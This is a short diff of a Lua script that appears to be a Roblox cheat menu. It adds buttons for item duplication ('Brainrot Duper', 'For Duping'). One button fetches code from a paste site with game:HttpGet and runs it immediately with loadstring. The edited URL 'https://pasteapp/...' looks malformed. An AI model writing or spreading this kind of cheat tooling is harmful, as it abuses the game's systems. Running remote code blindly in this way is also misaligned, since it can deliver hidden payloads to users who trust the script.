@@ -131,8 +131,8 @@ createButton("Button3", "Brainrot Duper", function()
 end)
 
 -- New scrollable button (renamed and formatted)
-createButton("Button4", "Vulnerable Server\n(Private Server)", function()
-    loadstring(game:HttpGet("https://pastefy.app/Hmd4FmZX/raw"))()
+createButton("Button4", "For Duping\n(1 Player On Server only)", function()
+    loadstring(game:HttpGet("https://pasteapp/Hmd4FmZX/raw"))()
 end)
 
 -- Close behavior
